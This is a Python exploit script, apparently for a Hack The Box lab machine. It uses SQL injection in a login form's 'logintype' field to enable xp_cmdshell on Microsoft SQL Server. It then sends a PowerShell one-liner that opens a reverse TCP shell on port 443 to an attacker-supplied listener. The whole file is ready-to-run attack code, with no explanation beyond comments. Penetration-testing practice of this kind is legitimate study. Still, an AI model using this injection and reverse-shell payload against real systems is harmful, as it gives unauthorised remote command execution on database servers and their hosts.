import requests 
import argparse
import traceback

def RevShell(lhost):
    # Enabling the xp_cmdshell
    url = "http://members.streetfighterclub.htb:80/old/verify.asp"
    cookies = {"ASPSESSIONIDSAQCSRTD": "NOKLNAMBDOEAKLIEAEKOBCMM", "Email": "", "Level": "%2D1", "Chk": "1693", "password": "dGVzdA%3D%3D", "username": "dGVzdA%3D%3D"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://members.streetfighterclub.htb", "Referer": "http://members.streetfighterclub.htb/old/Login.asp"}
    data = {"username": "test", "password": "test", "logintype": "3;EXEC sp_configure 'show advanced options', 1;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; -- -", "rememberme": "ON", "B1": "LogIn"}
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)
        if response.status_code == 302:
            print("[+] xp_cmdshell has been enabled successfully.")
            # Invoking reverse shell
            data_one_line_rev_shell = {
                "username": "test",
                "password": "test",
                "logintype": "3;execute xp_cmDshElL 'C:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe \"$client = new-object system.net.sockets.tcpclient(\\\"%s\\\",443);$stream = $client.getstream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.read($bytes, 0, $bytes.length)) -ne 0){;$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i);$sendback = (iex $data 2>&1 | out-string );$sendback2 = $sendback + \\\"PS \\\" + (pwd).path + \\\"^> \\\";$sendbyte = ([text.encoding]::ascii).getbytes($sendback2);$stream.write($sendbyte,0,$sendbyte.length);$stream.flush()};$client.close()\"';" % (lhost),
                "rememberme": "ON",
                "B1": "LogIn"
            }
            try:
                print("[*] Invoking the reverse shell. Please check you listener (on port 443)")
                requests.post(url, headers=headers, cookies=cookies, data=data_one_line_rev_shell)
            except Exception as e:
                print("[-] Error Invoking the reverse shell: ", e)
                traceback.print_exc()
    except Exception as e:
        print("[-] Error sending the Enable xp_cmdshell request: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Exploiting Microsoft SQL injection to gain a reverse shell on the target machine")
    parser.add_argument("lhost", help="Listener IP address")
    args = parser.parse_args()

    RevShell(args.lhost)

if __name__ == "__main__":
    main()
    
